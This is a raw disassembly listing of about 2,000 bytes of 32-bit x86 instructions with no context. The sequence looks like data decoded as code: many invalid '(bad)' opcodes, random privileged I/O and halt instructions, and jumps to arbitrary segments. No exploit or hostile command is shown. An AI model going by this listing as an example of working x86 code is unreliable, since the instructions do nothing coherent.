  416b87:	add    BYTE PTR [eax],al
  416b89:	or     cl,BYTE PTR [ebx]
  416b8b:	mov    esp,0xc84f2ce2
  416b90:	js     0x416b27
  416b92:	ficom  DWORD PTR [edi+0x18]
  416b95:	pop    esi
  416b96:	push   ds
  416b97:	out    dx,al
  416b98:	fcmovnbe st,st(0)
  416b9a:	sbb    al,0xc8
  416b9c:	icebp  
  416b9d:	in     al,dx
  416b9e:	sub    eax,0xfd8be9c2
  416ba3:	ror    DWORD PTR [ebx-0x76],cl
  416ba6:	fcomp  DWORD PTR [eax-0x78]
  416ba9:	or     al,0x77
  416bab:	fisttp WORD PTR [ebp-0x43]
  416bae:	cld    
  416baf:	(bad)  
  416bb0:	jecxz  0x416c28
  416bb2:	int    0xbb
  416bb4:	cmp    eax,0xc18c005f
  416bb9:	xchg   ecx,eax
  416bba:	or     edx,DWORD PTR [edx+0x4b257f1b]
  416bc0:	neg    al
  416bc2:	pushf  
  416bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bc4:	sti    
  416bc5:	cmp    BYTE PTR [esp+eiz*8],0x98
  416bc9:	das    
  416bca:	mov    ds:0xfd65cfed,eax
  416bcf:	push   eax
  416bd0:	mov    ch,0xdb
  416bd2:	mov    esi,0xf83d2263
  416bd7:	popf   
  416bd8:	pop    es
  416bd9:	loopne 0x416b80
  416bdb:	sub    ebx,DWORD PTR [eax-0x2a]
  416bde:	test   al,0x6f
  416be0:	sub    edi,DWORD PTR [edx-0x46]
  416be3:	jae    0x416bf5
  416be5:	rol    BYTE PTR [eax],1
  416be7:	xor    cl,BYTE PTR [eax-0xa]
  416bea:	jg     0x416c36
  416bec:	mov    eax,DWORD PTR [ebx-0x1d62e00e]
  416bf2:	sub    al,0x99
  416bf4:	mov    bl,dh
  416bf6:	test   al,0xd0
  416bf8:	xor    BYTE PTR [ecx+ebp*4-0x19d0e539],ch
  416bff:	out    dx,al
  416c00:	jmp    0x416bb2
  416c02:	jne    0x416bca
  416c04:	push   edx
  416c05:	mov    ecx,0x7ce07639
  416c0b:	stos   DWORD PTR es:[edi],eax
  416c0c:	enter  0xedca,0x77
  416c10:	nop
  416c11:	popf   
  416c12:	(bad)  
  416c13:	adc    ch,cl
  416c15:	daa    
  416c16:	or     DWORD PTR [edi-0x3f],esi
  416c19:	js     0x416b9b
  416c1b:	test   al,0x81
  416c1d:	sub    bh,dh
  416c1f:	in     eax,0x7e
  416c21:	jae    0x416bb0
  416c23:	(bad)  
  416c24:	push   eax
  416c25:	sbb    eax,0x5024b78f
  416c2a:	je     0x416be3
  416c2c:	das    
  416c2d:	jg     0x416c15
  416c2f:	adc    eax,DWORD PTR ds:0x2788469
  416c35:	loopne 0x416c92
  416c37:	inc    ecx
  416c38:	inc    edx
  416c39:	or     bl,BYTE PTR [ecx-0x5d34096]
  416c3f:	je     0x416c08
  416c41:	add    DWORD PTR [eax+0x49142b63],ebx
  416c47:	stc    
  416c48:	(bad)  
  416c49:	fistp  QWORD PTR [edx+ecx*4]
  416c4c:	cwde   
  416c4d:	sti    
  416c4e:	shl    esp,1
  416c50:	pop    ebp
  416c51:	cld    
  416c52:	add    ebp,DWORD PTR [ecx]
  416c54:	aaa    
  416c55:	sbb    eax,0xc4919efd
  416c5a:	xchg   ebx,eax
  416c5b:	stos   DWORD PTR es:[edi],eax
  416c5c:	das    
  416c5d:	or     esi,DWORD PTR [edx-0x741fe740]
  416c63:	and    BYTE PTR [esi-0x59],dl
  416c66:	leave  
  416c67:	mov    eax,0x54314480
  416c6c:	jmp    0x416cb3
  416c6e:	push   ebp
  416c6f:	sbb    BYTE PTR [esi-0x584f6113],al
  416c75:	xchg   edi,eax
  416c76:	pop    ebx
  416c77:	popa   
  416c78:	out    0xef,al
  416c7a:	(bad)  
  416c7b:	mov    ecx,0x5ba9bfc0
  416c80:	mov    ebp,ebx
  416c82:	and    dl,bh
  416c84:	jmp    0x416d00
  416c86:	popf   
  416c87:	xchg   DWORD PTR [eax],esp
  416c89:	push   ebp
  416c8a:	pop    ebp
  416c8b:	test   DWORD PTR [edi],ecx
  416c8d:	fild   WORD PTR [eax-0x2e]
  416c90:	lods   al,BYTE PTR ds:[esi]
  416c91:	pop    eax
  416c92:	ret    0xcb18
  416c95:	out    0xfc,eax
  416c97:	inc    ebp
  416c98:	fld    DWORD PTR [ecx-0x3c80a151]
  416c9e:	dec    esi
  416c9f:	enter  0x47dd,0x72
  416ca3:	rcpps  xmm7,XMMWORD PTR [eax+0x14959e5d]
  416caa:	std    
  416cab:	jmp    0x11a9:0x554cbdd9
  416cb2:	sbb    eax,ecx
  416cb4:	cwde   
  416cb5:	out    0x7f,eax
  416cb7:	imul   esp,DWORD PTR [edi+0x38],0xffffffae
  416cbb:	inc    esi
  416cbc:	jmp    0x416cdf
  416cbe:	cmp    eax,0x650e9ef9
  416cc3:	sbb    esp,ecx
  416cc5:	fbstp  TBYTE PTR [esi+0x20]
  416cc8:	and    al,BYTE PTR [ebx-0x1f]
  416ccb:	xor    DWORD PTR [eax+0x79180241],ebp
  416cd1:	and    BYTE PTR [ebp-0x5f],bh
  416cd4:	fsubr  DWORD PTR ds:0xdf379e15
  416cda:	das    
  416cdb:	cmp    ebp,DWORD PTR [ecx]
  416cdd:	mov    ebx,0x3008aed6
  416ce2:	std    
  416ce3:	shr    dh,1
  416ce5:	jmp    0x67ee90a0
  416cea:	xor    DWORD PTR [ebx+0x51a2e32d],ebx
  416cf0:	pop    edx
  416cf1:	push   ds
  416cf2:	or     al,0x48
  416cf4:	cs pop edx
  416cf6:	pusha  
  416cf7:	mov    ebx,0x5a8f94eb
  416cfc:	loop   0x416cb6
  416cfe:	shl    DWORD PTR [ebp-0x59],0xc9
  416d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d03:	enter  0x71aa,0x24
  416d07:	popf   
  416d08:	pushf  
  416d09:	fwait
  416d0a:	in     al,dx
  416d0b:	nop
  416d0c:	jmp    0x416cb9
  416d0e:	out    dx,eax
  416d0f:	mov    esp,0xa48f2f3a
  416d14:	or     al,0xdf
  416d16:	pop    DWORD PTR [ebx+eax*1]
  416d19:	add    DWORD PTR [ecx+edi*8],esp
  416d1c:	inc    edx
  416d1d:	ss add ah,al
  416d20:	mov    edi,0x299663c7
  416d25:	jg     0x416cec
  416d27:	add    DWORD PTR [esi+0x8],ecx
  416d2a:	sbb    BYTE PTR [edi+0x12d1646a],al
  416d30:	in     eax,dx
  416d31:	call   0xdfc75919
  416d36:	pop    es
  416d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d38:	test   BYTE PTR [edx+ebx*4],0xc2
  416d3c:	mov    eax,ds:0xe034f6de
  416d41:	push   eax
  416d42:	aad    0x91
  416d44:	call   0xffa2:0xa1fca8cf
  416d4b:	cwde   
  416d4c:	cmp    al,BYTE PTR [eax+0x57d26983]
  416d52:	dec    ebx
  416d53:	scas   eax,DWORD PTR es:[edi]
  416d54:	hlt    
  416d55:	fild   QWORD PTR [edx+0x1623ae2d]
  416d5b:	leave  
  416d5c:	and    bl,BYTE PTR [edi+0x29]
  416d5f:	sub    ch,bl
  416d61:	icebp  
  416d62:	call   0x32be:0xe0178ae0
  416d69:	fmul   QWORD PTR [edi-0x218099bf]
  416d6f:	xchg   edi,eax
  416d70:	jae    0x416d27
  416d72:	mov    ds:0x68f5ed55,eax
  416d77:	sub    DWORD PTR [ebx],esi
  416d79:	aas    
  416d7a:	jne    0x416de1
  416d7c:	jmp    0xbf0a2590
  416d81:	sti    
  416d82:	dec    ebx
  416d83:	mov    ecx,0xeec3b454
  416d88:	out    0x4e,al
  416d8a:	dec    ebp
  416d8b:	pop    ss
  416d8c:	pushf  
  416d8d:	mov    esi,0x330bd4bb
  416d92:	inc    ebx
  416d93:	xor    eax,0xd01edccb
  416d98:	dec    edx
  416d99:	stos   BYTE PTR es:[edi],al
  416d9a:	pop    ds
  416d9b:	das    
  416d9c:	cmp    ebp,0xffffff9d
  416d9f:	mov    ds:0x4e5863e3,al
  416da4:	jp     0x416df3
  416da6:	fld    st(7)
  416da8:	pop    DWORD PTR [ebx-0x2032aaab]
  416dae:	aaa    
  416daf:	fnstenv [edx+0x60]
  416db2:	sub    BYTE PTR [ecx-0x3cd7de88],ah
  416db8:	jmp    0x416e27
  416dba:	(bad)  
  416dbb:	xor    al,cl
  416dbd:	mov    ds:0xde1617d4,eax
  416dc2:	(bad)  
  416dc3:	jle    0x416d4f
  416dc5:	push   edi
  416dc6:	xor    ebx,DWORD PTR [esi-0x2b]
  416dc9:	sub    ebx,DWORD PTR [esp+ecx*4-0x5d]
  416dcd:	fdiv   st,st(5)
  416dcf:	ds rcr ebx,1
  416dd2:	sbb    al,0xc8
  416dd4:	add    bl,bl
  416dd6:	sub    ebx,esp
  416dd8:	pop    edx
  416dd9:	(bad)  
  416ddb:	or     BYTE PTR [esi],dl
  416ddd:	inc    ebx
  416dde:	xchg   ebp,ebp
  416de0:	xlat   BYTE PTR ds:[ebx]
  416de1:	ja     0x416de0
  416de3:	jno    0x416d9e
  416de5:	pop    ebx
  416de6:	cmp    edi,esi
  416de8:	mov    al,ds:0xbc811ec
  416ded:	lods   al,BYTE PTR ds:[esi]
  416dee:	or     edx,0xdbfe89c
  416df4:	fimul  WORD PTR [edx+0x5f706166]
  416dfa:	or     al,0xaa
  416dfc:	cmp    BYTE PTR [edi-0x20ea82cc],bl
  416e02:	loop   0x416e55
  416e04:	cmp    BYTE PTR [edi+esi*4-0x31208ff],0x81
  416e0c:	cdq    
  416e0d:	ss sub cl,ah
  416e10:	xlat   BYTE PTR ds:[ebx]
  416e11:	dec    esp
  416e12:	(bad)
  416e15:	mov    bh,0x7c
  416e17:	lods   al,BYTE PTR ds:[esi]
  416e18:	xor    ah,cl
  416e1a:	icebp  
  416e1b:	pop    ecx
  416e1c:	push   esi
  416e1d:	mov    bl,0xfc
  416e1f:	frstor [esi+0xd]
  416e22:	fs (bad) 
  416e25:	aaa    
  416e26:	sbb    eax,0x8ad9f2a0
  416e2b:	mov    BYTE PTR [eax+0x66e4d873],dl
  416e31:	push   edx
  416e32:	push   0xdd1d4e48
  416e37:	mov    BYTE PTR [ecx+ecx*8+0x62eb302f],ah
  416e3e:	xchg   DWORD PTR [ecx+0x77b1dd51],ebp
  416e44:	out    0xf1,eax
  416e46:	imul   ecx
  416e48:	mov    ch,0xdf
  416e4a:	fwait
  416e4b:	pop    esp
  416e4c:	imul   edx,DWORD PTR [edx+0x3feb848d],0xffffffab
  416e53:	out    0x6,al
  416e55:	cmp    eax,0x47c8d003
  416e5a:	mov    ds:0xf3fa3bdd,eax
  416e5f:	sbb    ebx,ecx
  416e61:	popa   
  416e62:	mov    ds:0x5b483f08,eax
  416e67:	lahf   
  416e68:	ror    DWORD PTR [ecx],0x2
  416e6b:	mov    cl,0x2a
  416e6d:	adc    eax,0x18da17d
  416e72:	mov    ds:0x7ddf57f0,al
  416e77:	fidivr DWORD PTR [esi]
  416e79:	push   esp
  416e7a:	adc    BYTE PTR [eax-0x6c031cdd],0x64
  416e81:	push   ds
  416e82:	xchg   BYTE PTR [ecx-0x5f9dc613],bl
  416e88:	mov    cs,WORD PTR [ecx]
  416e8a:	mov    gs,WORD PTR [edx-0x16]
  416e8d:	fdivr  DWORD PTR [edx+0x7657b658]
  416e93:	jb     0x416e74
  416e95:	pop    ss
  416e96:	or     DWORD PTR [esi],edi
  416e98:	jmp    0x416e9e
  416e9a:	add    eax,0x17891a19
  416e9f:	inc    ebp
  416ea0:	dec    ebx
  416ea1:	fbld   TBYTE PTR [esi+0x65f044bd]
  416ea7:	repz pusha 
  416ea9:	out    dx,al
  416eaa:	jmp    DWORD PTR [esi-0x63]
  416ead:	and    edx,DWORD PTR [edi+ecx*4-0x66]
  416eb1:	addr16 xor esp,ebx
  416eb4:	rcl    ebx,cl
  416eb6:	mov    al,bh
  416eb8:	mov    ah,0xd2
  416eba:	mov    esp,0xb04faba2
  416ebf:	popf   
  416ec0:	test   al,0x7
  416ec2:	std    
  416ec3:	or     al,0x82
  416ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ec6:	sub    BYTE PTR [edx+0x5f],0xbb
  416eca:	mov    esp,ecx
  416ecc:	cmp    cl,BYTE PTR [ecx-0x3]
  416ecf:	adc    eax,0xd7f3ebb7
  416ed4:	push   edx
  416ed5:	mov    bh,0xf2
  416ed7:	sti    
  416ed8:	push   0xffffff83
  416eda:	pop    ss
  416edb:	popf   
  416edc:	sub    esp,esp
  416ede:	and    eax,0x7c6ab950
  416ee3:	shl    BYTE PTR [ebx+0x22767dee],0x20
  416eea:	std    
  416eeb:	pop    esp
  416eec:	mov    edx,ds
  416eee:	push   0xffffffce
  416ef0:	imul   ecx,DWORD PTR [eax+ecx*1+0x3f51d9a1],0x61387cc8
  416efb:	icebp  
  416efc:	mov    eax,ds:0xebd83206
  416f01:	and    dl,BYTE PTR [esi]
  416f03:	stos   DWORD PTR es:[edi],eax
  416f04:	sahf   
  416f05:	out    dx,eax
  416f06:	mov    bl,0xf7
  416f08:	sub    eax,0xe574f3df
  416f0d:	ja     0x416f43
  416f0f:	(bad)  
  416f10:	in     eax,dx
  416f11:	push   esi
  416f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f13:	sbb    ebx,ebp
  416f15:	cmp    DWORD PTR [edx],ecx
  416f17:	sub    al,0x6f
  416f19:	hlt    
  416f1a:	cmp    eax,0x83df3652
  416f1f:	sub    ebp,DWORD PTR [ebp+0x116f991b]
  416f25:	sub    esp,DWORD PTR [edi]
  416f27:	xchg   esi,eax
  416f28:	jmp    0x416ee1
  416f2a:	mov    dh,0x8f
  416f2c:	mov    ch,0xff
  416f2e:	(bad)  
  416f2f:	dec    edi
  416f30:	(bad)  
  416f31:	(bad)  
  416f33:	jno    0x416edf
  416f35:	and    bh,BYTE PTR es:[eax+0x57f2b4b1]
  416f3c:	emms   
  416f3e:	mov    DWORD PTR [eax-0xd],ebp
  416f41:	fst    DWORD PTR [edi-0x8]
  416f44:	imul   ebx,edi,0x85c1b7a5
  416f4a:	xor    al,0x24
  416f4c:	fild   DWORD PTR [ecx-0x4b0a47d6]
  416f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f53:	mov    edi,0x5fe5a4eb
  416f58:	jae    0x416fa2
  416f5a:	pop    edx
  416f5b:	enter  0x6a04,0x8c
  416f5f:	pslld  mm0,QWORD PTR [ecx+0x35]
  416f63:	(bad)
  416f66:	or     BYTE PTR [ebp-0x2],bh
  416f69:	cmc    
  416f6a:	fild   QWORD PTR [edi+0x65]
  416f6d:	and    al,0x64
  416f6f:	mov    esp,0xae8e687
  416f74:	jo     0x416fa0
  416f76:	fwait
  416f77:	mov    al,0x83
  416f79:	mov    ds:0xaeebd253,al
  416f7e:	mov    ds:0x4864189,al
  416f83:	lock sbb edi,0xe469df09
  416f8a:	fistp  WORD PTR [edi]
  416f8c:	es sub eax,0x76e11099
  416f92:	or     BYTE PTR [eax+0x11],0xcb
  416f96:	out    0x55,eax
  416f98:	cdq    
  416f99:	pop    ds
  416f9a:	(bad)  
  416f9b:	xor    DWORD PTR [eax-0x21],eax
  416f9e:	jge    0x416f52
  416fa0:	adc    eax,DWORD PTR [eax+0x2a]
  416fa3:	push   edx
  416fa4:	sti    
  416fa5:	push   ecx
  416fa6:	std    
  416fa7:	scas   al,BYTE PTR es:[edi]
  416fa8:	xchg   esp,eax
  416fa9:	xchg   esp,eax
  416faa:	sbb    dl,dh
  416fac:	inc    esp
  416fad:	nop
  416fae:	ret    
  416faf:	xor    BYTE PTR [ecx],ch
  416fb1:	fild   QWORD PTR [eax]
  416fb3:	addr16 mov al,ds:0xc092
  416fb7:	push   esi
  416fb8:	data16 out 0x2,al
  416fbb:	push   ebx
  416fbc:	xchg   ebp,eax
  416fbd:	pop    edi
  416fbe:	ss ret 0x5f40
  416fc2:	stc    
  416fc3:	xchg   BYTE PTR [ecx+0x35],bh
  416fc6:	adc    DWORD PTR [edi+edx*8],ebx
  416fc9:	push   ebx
  416fca:	xor    bl,BYTE PTR [eax]
  416fcc:	add    eax,0x24c85ac6
  416fd1:	xchg   ecx,eax
  416fd2:	push   0x329bbe72
  416fd7:	or     al,ch
  416fd9:	xchg   edi,eax
  416fda:	repz jge 0x417004
  416fdd:	cmp    eax,0x8e30607e
  416fe2:	mov    eax,ds:0x23df1644
  416fe7:	lds    ecx,FWORD PTR [edx-0x2f329025]
  416fed:	mov    edi,ebp
  416fef:	adc    ebp,DWORD PTR [edi+eiz*2-0x64]
  416ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff4:	cmp    eax,0xa0956e3f
  416ff9:	(bad)  
  416ffb:	or     al,0xca
  416ffd:	dec    edi
  416ffe:	adc    DWORD PTR [edi-0x3b02faef],ebp
  417004:	push   edx
  417005:	push   ds
  417006:	inc    esi
  417007:	adc    DWORD PTR [ebp+0x21],eax
  41700a:	xchg   esp,eax
  41700b:	mov    eax,ds:0x7000fb26
  417010:	sub    edx,0xffffffc7
  417013:	or     BYTE PTR [esp+edx*1+0x54],al
  417017:	pop    ecx
  417018:	mov    cl,0x18
  41701a:	std    
  41701b:	mov    ch,0x10
  41701d:	pop    ecx
  41701e:	stos   BYTE PTR es:[edi],al
  41701f:	mov    ecx,0xc9d07f88
  417024:	out    0xf,eax
  417026:	cmp    al,0xd2
  417028:	or     dl,ah
  41702a:	fcomp  DWORD PTR [edi]
  41702c:	(bad)  
  41702d:	in     eax,dx
  41702e:	cld    
  41702f:	hlt    
  417030:	js     0x416fde
  417032:	test   al,0xbe
  417034:	dec    ebx
  417035:	cmp    BYTE PTR [edi],bl
  417037:	enter  0x1d9f,0xa2
  41703b:	adc    BYTE PTR [ebp-0x1483efe],bl
  417041:	mov    edi,DWORD PTR [eax+0x6e]
  417044:	sub    ebx,DWORD PTR [ebx+0x6f]
  417047:	pusha  
  417048:	loope  0x41705b
  41704a:	jns    0x417009
  41704c:	pop    ebx
  41704d:	or     al,0x9e
  41704f:	enter  0xcc27,0x83
  417053:	jne    0x41703c
  417055:	out    dx,al
  417056:	cld    
  417057:	dec    esi
  417058:	and    eax,0x61bedd2
  41705d:	ret    0xc73a
  417060:	mov    ah,0x84
  417062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417063:	rol    cl,1
  417065:	outs   dx,DWORD PTR ds:[esi]
  417066:	xchg   bh,dl
  417068:	nop
  417069:	(bad)  
  41706a:	cld    
  41706b:	mov    ebp,0x1e844cd0
  417070:	or     BYTE PTR [ebx+0x52edc884],ch
  417076:	test   eax,0xbf29d497
  41707b:	jnp    0x41706a
  41707d:	out    dx,eax
  41707e:	inc    DWORD PTR [ebx-0x60]
  417081:	lahf   
  417082:	fld    TBYTE PTR ds:0xc865b610
  417088:	push   ss
  417089:	jb     0x4170e9
  41708b:	cdq    
  41708c:	jge    0x417078
  41708e:	pop    esi
  41708f:	shr    ch,cl
  417091:	cmp    ecx,DWORD PTR [esi+0x1f]
  417094:	sub    al,0x3f
  417096:	dec    esp
  417097:	add    ecx,DWORD PTR [ebp-0x74]
  41709a:	cmp    BYTE PTR [ebp+0x4763c5e0],0x26
  4170a1:	adc    al,0x0
  4170a3:	push   0x822db8af
  4170a8:	jmp    0x417083
  4170aa:	push   ebx
  4170ab:	xchg   esp,eax
  4170ac:	lds    ebx,FWORD PTR [edi+0x7a]
  4170af:	mov    al,BYTE PTR [esi-0x25e2c38]
  4170b5:	fcom   QWORD PTR [ecx+0x78]
  4170b8:	fidivr DWORD PTR [esi+0x243b07c9]
  4170be:	retf   
  4170bf:	mov    ebp,0xf6e613f6
  4170c4:	jmp    0x4170d9
  4170c6:	imul   ebx,DWORD PTR [eax+eiz*2],0x6c
  4170ca:	and    al,0x9d
  4170cc:	out    dx,eax
  4170cd:	fsub   st,st(6)
  4170cf:	xchg   ebx,eax
  4170d0:	xchg   BYTE PTR [ebx*1-0x282f3f6a],dh
  4170d7:	or     ebp,ebx
  4170d9:	push   ebp
  4170da:	sub    BYTE PTR [esi+0x65],ch
  4170dd:	add    edx,ecx
  4170df:	xchg   esp,eax
  4170e0:	inc    eax
  4170e1:	fistp  QWORD PTR [edi+ecx*4+0x4b]
  4170e5:	ret    
  4170e6:	inc    edi
  4170e7:	jne    0x417139
  4170e9:	or     ch,bh
  4170eb:	lock lods al,BYTE PTR ds:[esi]
  4170ed:	in     al,dx
  4170ee:	cdq    
  4170ef:	cld    
  4170f0:	mov    WORD PTR [edx+0xf],?
  4170f3:	enter  0x15b7,0xbe
  4170f7:	adc    DWORD PTR [ebx],ecx
  4170f9:	pop    edi
  4170fa:	mov    eax,0x75bcebd3
  4170ff:	or     al,0xf7
  417101:	call   0xe00058e6
  417106:	nop
  417107:	xchg   edi,eax
  417108:	mov    dh,0x8d
  41710a:	stos   DWORD PTR es:[edi],eax
  41710b:	mov    cl,0x6d
  41710d:	or     bh,ch
  41710f:	enter  0xe7e9,0x21
  417113:	test   eax,0xc8459f3c
  417118:	inc    eax
  417119:	adc    DWORD PTR [esi],esp
  41711b:	cld    
  41711c:	jge    0x4170e3
  41711e:	xchg   ebx,eax
  41711f:	fsubr  st,st(3)
  417121:	clc    
  417122:	(bad)  
  417123:	popa   
  417124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417125:	jae    0x4170cf
  417127:	in     al,dx
  417128:	in     eax,0xde
  41712a:	mov    bl,0x56
  41712c:	jae    0x417100
  41712e:	or     BYTE PTR [ecx+0x67],0x37
  417132:	(bad)  
  417134:	jmp    0x6fd7:0x4697ea11
  41713b:	dec    ebp
  41713c:	imul   eax,DWORD PTR [esi-0x5],0x38
  417140:	pop    eax
  417141:	jmp    0x8d70:0xdf4346c5
  417148:	jns    0x4170f5
  41714a:	stos   DWORD PTR es:[edi],eax
  41714b:	adc    esp,ebp
  41714d:	or     edx,ecx
  41714f:	imul   esp,DWORD PTR [edi+0x370873f1],0x66
  417156:	inc    esi
  417157:	popf   
  417158:	ret    
  417159:	fild   WORD PTR [edx-0x26]
  41715c:	push   ecx
  41715d:	iret   
  41715e:	jp     0x4171c8
  417160:	in     eax,dx
  417161:	sub    al,0xfd
  417163:	mov    ds:0xbfc8918d,al
  417168:	jno    0x417187
  41716a:	jge    0x417134
  41716c:	addr16 xchg edx,eax
  41716e:	push   ebp
  41716f:	mov    eax,ds:0x6310716f
  417174:	jmp    0x417183
  417176:	mov    bl,0x5b
  417178:	pcmpeqw mm3,mm7
  41717b:	pop    ss
  41717c:	dec    edi
  41717d:	fisttp WORD PTR [esi]
  41717f:	es stos DWORD PTR es:[edi],eax
  417181:	jb     0x4171f4
  417183:	cmp    esi,0x7e
  417186:	add    edx,DWORD PTR [ebp-0x31]
  417189:	(bad)  
  41718a:	cmp    al,0xf1
  41718c:	jl     0x417190
  41718e:	fadd   DWORD PTR fs:[ecx]
  417191:	fxam   
  417193:	stc    
  417194:	call   0x6927:0xa0051cc3
  41719b:	pop    esp
  41719c:	neg    DWORD PTR [ebp+0x67]
  41719f:	repnz and bh,bl
  4171a2:	pop    ecx
  4171a3:	mov    ebx,0x89e67803
  4171a8:	aas    
  4171a9:	fild   QWORD PTR [ecx-0x265fe1]
  4171af:	iret   
  4171b0:	and    edx,DWORD PTR [ebp-0x3]
  4171b3:	js     0x417200
  4171b5:	xchg   esi,eax
  4171b6:	sbb    DWORD PTR [ecx-0x56],ecx
  4171b9:	ret    
  4171ba:	pop    ebx
  4171bb:	leave  
  4171bc:	aaa    
  4171bd:	sbb    BYTE PTR [ecx],cl
  4171bf:	sub    DWORD PTR [ebp+0x1d2c6c12],edi
  4171c5:	push   edx
  4171c6:	std    
  4171c7:	jne    0x41717d
  4171c9:	jmp    0x4171de
  4171cb:	mov    ds:0xc8b7100f,al
  4171d0:	cmp    dl,BYTE PTR [edx+0x5508ff0c]
  4171d6:	mov    es,eax
  4171d8:	jmp    0x4171df
  4171da:	mov    edi,0x9cfb1b7c
  4171df:	mov    ch,0x9e
  4171e1:	fbstp  TBYTE PTR [esi]
  4171e3:	sub    al,0x2c
  4171e5:	inc    ebx
  4171e6:	mov    dh,0x4d
  4171e8:	mov    ebx,0xfe4f90e1
  4171ed:	scas   al,BYTE PTR es:[edi]
  4171ee:	mov    edx,0x983eab18
  4171f3:	es mov dh,0xa
  4171f6:	mov    cl,0x20
  4171f8:	xchg   ecx,eax
  4171f9:	fiadd  WORD PTR [ecx-0x19ae867e]
  4171ff:	push   esp
  417200:	pop    edi
  417201:	das    
  417202:	out    dx,al
  417203:	iret   
  417204:	jmp    0x417220
  417206:	lods   eax,DWORD PTR ds:[esi]
  417207:	mov    eax,0xdf3948a8
  41720c:	adc    edi,ebx
  41720e:	or     eax,DWORD PTR [ecx+edx*4-0x2f]
  417212:	jbe    0x417207
  417214:	icebp  
  417215:	and    eax,DWORD PTR [eax]
  417217:	les    esi,FWORD PTR [ecx+edx*2-0x7867d9e1]
  41721e:	xor    al,0xb1
  417220:	call   0xeb76312c
  417225:	arpl   di,cx
  417227:	or     al,0x5b
  417229:	fsubr  QWORD PTR [edx+0x1d]
  41722c:	jmp    0x4171fc
  41722e:	xor    DWORD PTR [edi-0x41],0xffffffa2
  417232:	loopne 0x41729e
  417234:	cmp    bh,bl
  417236:	out    dx,eax
  417237:	mov    bh,cl
  417239:	pop    esp
  41723a:	mov    edx,0xa5f0c836
  41723f:	add    ch,ch
  417241:	(bad)  
  417244:	sub    eax,0x3473fb51
  417249:	push   0xffffff87
  41724b:	iret   
  41724c:	ficom  DWORD PTR [esi-0xb]
  41724f:	loope  0x4171f1
  417251:	lahf   
  417252:	mov    bl,0x26
  417254:	aaa    
  417255:	pop    ebp
  417256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417257:	jecxz  0x417244
  417259:	ror    WORD PTR [edx-0x3d],cl
  41725d:	outs   dx,DWORD PTR ds:[esi]
  41725e:	les    esi,FWORD PTR [esi]
  417260:	pop    ecx
  417261:	fild   QWORD PTR [ebp+0x77]
  417264:	mov    ds:0xfba4e92f,al
  417269:	jo     0x417268
  41726b:	and    DWORD PTR ds:0xf1cd6949,ecx
  417271:	ss inc edi
  417274:	push   ss
  417275:	push   ecx
  417276:	and    BYTE PTR [ebx+0x268b4f13],ah
  41727c:	in     eax,dx
  41727d:	sbb    ebp,DWORD PTR [edx-0x5d2113ff]
  417283:	jne    0x41727e
  417285:	adc    ah,BYTE PTR [ebp+0xbdfa1c3]
  41728b:	xchg   DWORD PTR [edx+0x1792482d],ecx
  417291:	sub    DWORD PTR [esi],0xffffff93
  417294:	hlt    
  417295:	ja     0x417296
  417297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417298:	cs pop edi
  41729a:	xlat   BYTE PTR ds:[ebx]
  41729b:	cmp    DWORD PTR [esi],esp
  41729d:	pop    ecx
  41729e:	(bad)  
  41729f:	enter  0x54c9,0x20
  4172a3:	push   es
  4172a4:	pop    edx
  4172a5:	fsub   DWORD PTR ds:0xc543ebfa
  4172ab:	js     0x4172e9
  4172ad:	mov    edi,0xdf4bd0d3
  4172b2:	ins    BYTE PTR es:[edi],dx
  4172b3:	xchg   edi,eax
  4172b4:	push   ds
  4172b5:	arpl   WORD PTR [ebx+0x3e],dx
  4172b8:	scas   eax,DWORD PTR es:[edi]
  4172b9:	popf   
  4172ba:	cld    
  4172bb:	push   eax
  4172bc:	test   DWORD PTR cs:[eax+0x1db74935],edi
  4172c3:	retf   
  4172c4:	adc    BYTE PTR [esi-0x1cd546b0],ah
  4172ca:	push   esp
  4172cb:	cmp    eax,0x4f93da0
  4172d0:	jmp    DWORD PTR [edx+0x536b493c]
  4172d6:	or     BYTE PTR [ecx+0x31],dh
  4172d9:	xor    eax,0xe10fc807
  4172de:	rol    edi,0x3c
  4172e1:	push   ds
  4172e2:	mov    ds:0x3d7b8e04,eax
  4172e7:	popf   
  4172e8:	stos   DWORD PTR es:[edi],eax
  4172e9:	and    al,0x68
  4172eb:	test   BYTE PTR ds:0xa0c87141,ch
  4172f1:	call   FWORD PTR [esi-0x4b]
  4172f4:	rol    edi,1
  4172f6:	(bad)  
  4172f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f8:	jmp    0x417312
  4172fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172fb:	push   0x1746d1bf
  417300:	sbb    bh,0x73
  417303:	mov    esp,0xdd9d8357
  417308:	mov    edx,0x1cb5e800
  41730d:	shl    BYTE PTR [edi],cl
  41730f:	or     ebp,esp
  417311:	jb     0x41733e
  417313:	in     eax,0x59
  417315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417316:	shr    edi,0x1f
  417319:	fisubr WORD PTR [eax]
  41731b:	enter  0x2c8c,0xb
  41731f:	loop   0x4172e3
  417321:	and    eax,0x46ebe92f
  417326:	mov    edx,DWORD PTR [ecx]
  417328:	out    dx,eax
  417329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41732a:	push   esi
  41732b:	and    al,0xb
  41732d:	(bad)  
  41732f:	mov    ds:0x39149296,al
  417334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417335:	icebp  
  417336:	cld    
  417337:	ja     0x417336
  417339:	xchg   ebx,eax
  41733a:	push   ebp
  41733b:	mov    ebp,0xc8afa551
  417340:	mov    edx,0x8e1edc02
  417345:	cmp    al,0x2d
  417347:	in     al,0xeb
  417349:	ret    0x66f2
  41734c:	addr16 out 0x34,al
  41734f:	mov    ebp,DWORD PTR [edi-0x5196c421]
  417355:	test   BYTE PTR [ecx-0xc3b990f],ah
  41735b:	push   ss
